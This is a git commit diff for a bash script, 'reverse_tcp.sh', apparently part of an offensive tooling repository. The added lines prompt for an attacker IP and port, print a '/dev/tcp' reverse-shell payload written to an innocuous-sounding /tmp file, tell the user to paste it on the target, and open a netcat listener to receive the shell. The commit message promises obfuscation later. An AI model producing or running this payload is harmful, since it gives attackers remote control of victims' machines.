5fb057286856ceafc18090cca7d79df520329f83
S1aX0r <188893348+S1aX0r@users.noreply.github.com>
2026-07-26 03:04:26 +0000

    Updated script
    Added reverse shell payload (will add obfuscation later and PTY upgrade)

--- eepymodules/reverse_tcp.sh
+++ eepymodules/reverse_tcp.sh
@@ -1,3 +1,17 @@
 #!/bin/bash
 
+RED='\033[0;31m'
+NC='\033[0m'
+
 echo "Reverse shell handler with PTY upgrade abilities"
+
+read -p "LHOST IP: " LHOST
+read -p "LHOST PORT: " LPORT
+
+echo
+echo -e "Here's Your Payload: $RED echo 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > /tmp/sysnet.sh $NC"
+echo
+echo "Paste payload on target and wait for the shell!"
+echo
+
+nc -lvnp $LPORT
